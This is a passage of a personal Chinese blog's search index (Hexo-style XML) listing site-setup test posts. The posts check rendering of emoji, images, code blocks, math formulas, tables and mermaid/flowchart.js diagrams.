fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png?v8">&#x1f61b;</span><span class="emoji" alias="sleeping" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f634.png?v8">&#x1f634;</span><span class="emoji" alias="worried" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61f.png?v8">&#x1f61f;</span><span class="emoji" alias="frowning" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f626.png?v8">&#x1f626;</span><span class="emoji" alias="anguished" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f627.png?v8">&#x1f627;</span><span class="emoji" alias="open_mouth" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62e.png?v8">&#x1f62e;</span><span class="emoji" alias="grimacing" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62c.png?v8">&#x1f62c;</span><span class="emoji" alias="confused" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f615.png?v8">&#x1f615;</span><span class="emoji" alias="hushed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62f.png?v8">&#x1f62f;</span><span class="emoji" alias="expressionless" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f611.png?v8">&#x1f611;</span><span class="emoji" alias="unamused" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f612.png?v8">&#x1f612;</span><span class="emoji" alias="sweat_smile" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8">&#x1f605;</span><span class="emoji" alias="sweat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">&#x1f613;</span><span class="emoji" alias="disappointed_relieved" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f625.png?v8">&#x1f625;</span><span class="emoji" alias="weary" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">&#x1f629;</span><span class="emoji" alias="pensive" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f614.png?v8">&#x1f614;</span><span class="emoji" alias="disappointed" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61e.png?v8">&#x1f61e;</span><span class="emoji" alias="confounded" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f616.png?v8">&#x1f616;</span><span class="emoji" alias="fearful" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f628.png?v8">&#x1f628;</span><span class="emoji" alias="cold_sweat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">&#x1f630;</span><span class="emoji" alias="persevere" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f623.png?v8">&#x1f623;</span><span class="emoji" alias="cry" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">&#x1f622;</span><span class="emoji" alias="sob" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">&#x1f62d;</span><span class="emoji" alias="joy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">&#x1f602;</span><span class="emoji" alias="astonished" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f632.png?v8">&#x1f632;</span><span class="emoji" alias="scream" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f631.png?v8">&#x1f631;</span><span class="emoji" alias="thought_balloon" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ad.png?v8">&#x1f4ad;</span><span class="emoji" alias="tired_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62b.png?v8">&#x1f62b;</span><span class="emoji" alias="angry" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f620.png?v8">&#x1f620;</span><span class="emoji" alias="rage" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f621.png?v8">&#x1f621;</span><span class="emoji" alias="triumph" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f624.png?v8">&#x1f624;</span><span class="emoji" alias="sleepy" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62a.png?v8">&#x1f62a;</span><span class="emoji" alias="yum" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60b.png?v8">&#x1f60b;</span><span class="emoji" alias="mask" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f637.png?v8">&#x1f637;</span><span class="emoji" alias="sunglasses" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8">&#x1f60e;</span><span class="emoji" alias="dizzy_face" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f635.png?v8">&#x1f635;</span><span class="emoji" alias="imp" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f47f.png?v8">&#x1f47f;</span><span class="emoji" alias="smiling_imp" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f608.png?v8">&#x1f608;</span><span class="emoji" alias="speech_balloon" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ac.png?v8">&#x1f4ac;</span><span class="emoji" alias="no_mouth" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f636.png?v8">&#x1f636;</span><span class="emoji" alias="innocent" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f607.png?v8">&#x1f607;</span><span class="emoji" alias="alien" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f47d.png?v8">&#x1f47d;</span><span class="emoji" alias="yellow_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49b.png?v8">&#x1f49b;</span><span class="emoji" alias="blue_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f499.png?v8">&#x1f499;</span><span class="emoji" alias="purple_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49c.png?v8">&#x1f49c;</span><span class="emoji" alias="heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2764.png?v8">&#x2764;</span><span class="emoji" alias="green_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49a.png?v8">&#x1f49a;</span><span class="emoji" alias="broken_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f494.png?v8">&#x1f494;</span><span class="emoji" alias="heartbeat" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f493.png?v8">&#x1f493;</span><span class="emoji" alias="heartpulse" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f497.png?v8">&#x1f497;</span><span class="emoji" alias="two_hearts" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f495.png?v8">&#x1f495;</span><span class="emoji" alias="revolving_hearts" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f49e.png?v8">&#x1f49e;</span><span class="emoji" alias="cupid" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f498.png?v8">&#x1f498;</span><span class="emoji" alias="sparkling_heart" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f496.png?v8">&#x1f496;</span><span class="emoji" alias="sparkles" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png?v8">&#x2728;</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片测试</title>
      <link href="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>花了点时间把站点的图片渲染插件修好了，现在展示图片应该没问题了，下面放几张壁纸测试一下</p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074655175.png" alt="image-20230815074655175"></p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074722240.png" alt="image-20230815074722240"></p><p><img src="/2023/08/15/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/image-20230815074733533-1692099736414-1.png" alt="image-20230815074733533"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站说明</title>
      <link href="/2023/08/13/%E5%BB%BA%E7%AB%99%E8%AF%B4%E6%98%8E/"/>
      <url>/2023/08/13/%E5%BB%BA%E7%AB%99%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<p>一时兴起，决定搭建个博客玩玩。主要也不知道写什么，博客会慢慢完善。看了很多博客主题，感觉个人还是喜欢素一点的。现在发展的太快了，各类优秀的博客主题不断涌现，内容过于丰富。对我而言，还是朴素些吧，朴素拥有无数潜能，也能享受到开发一个又一个模块的乐趣。我会测试一些markdown的渲染，我对markdown解析的要求不高，能写字就行，用不着什么高亮、流程图之类的，适合自己的就好，相应的插件会慢慢补上和调试</p><p>下面测试代码块、公式块、表格、表情</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">这是代码块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">$x &#x3D; &quot;just go go!&quot; ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是简单公式块<br>$$<br>7x \times 2y \neq 3z<br>$$</p><p>$$<br>7x + 2y &#x3D; 3z<br>$$</p><p>$$<br>x^3+x^9+x^y<br>$$</p><p>这是复杂公式块<br>$$<br>\Gamma(z) &#x3D; \int_0^\infty t^{z-1}e^{-t}dt,.<br>\Gamma(z) &#x3D; \int_0^\infty t^{z-1}e^{-t}dt,.<br>$$</p><p>$$<br>\lim\limits_{x \to \infty} \exp(-x) &#x3D; 0<br>$$</p><p>$$<br>X(m,n)&#x3D;<br>\begin{cases}<br>x(n),\<br>x(n-1),\<br>x(n+1)<br>\end{cases}<br>$$</p><p>这是表格</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>这是雪人表情</p><p><span class="emoji" alias="snowman" style fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26c4.png?v8">&#x26c4;</span></p>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流程图测试</title>
      <link href="/2023/08/13/%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/08/13/%E6%B5%81%E7%A8%8B%E5%9B%BE%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>修好了流程图的渲染，现在支持mermaid和flowchart等主流流程图的渲染了</p><p>mermaid流程图</p><pre class="mermaid">sequenceDiagram    loop Daily query        Alice->>Bob: Hello Bob, how are you?        alt is sick            Bob->>Alice: Not so good :(        else is well            Bob->>Alice: Feeling fresh like a daisy        end        opt Extra response            Bob->>Alice: Thanks for asking        end    end</pre><pre class="mermaid">graph TD    B((开始)) -->C{判断}    C --  a=1 -->D[执行语句1]    C --  a=2  -->E[执行语句2]    C --  a=3 -->F[执行语句3]    C -- a=4  -->G[执行语句4]    D--> AA((结束))    E--> AA    F--> AA   G--> AA</pre><pre class="mermaid">graph TD;    A-->B;    A-->C;    B-->D;    C-->D;</pre><p>flowchart流程图</p><div id="flowchart-0" class="flow-chart"></div><div id="flowchart-1" class="flow-chart"></div><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 开始节点in=>inputoutput: 输入e=>end: 结束节点op=>operation: 操作节点cond=>condition: 条件节点sub=>subroutine: 子例程out=>inputoutput: 输出st(right)->in->op->condcond(yes,right)->out->econd(no)->sub</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: Starti=>inputoutput: 输入年份ncond1=>condition: n能否被4整除？cond2=>condition: n能否被100整除？cond3=>condition: n能否被400整除？o1=>inputoutput: 输出非闰年o2=>inputoutput: 输出非闰年o3=>inputoutput: 输出闰年o4=>inputoutput: 输出闰年e=>endst->i->cond1cond1(no)->o1->econd1(yes)->cond2cond2(no)->o3->econd2(yes)->cond3cond3(yes)->o2->econd3(no)->o4->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，世界</title>
      <link href="/2023/08/12/%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/"/>
      <url>/2023/08/12/%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1>你好，世界</h1><!DOCTYPE html><html><head><meta charset="utf-8"><title>test</title></head><body><p>你好，世界</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
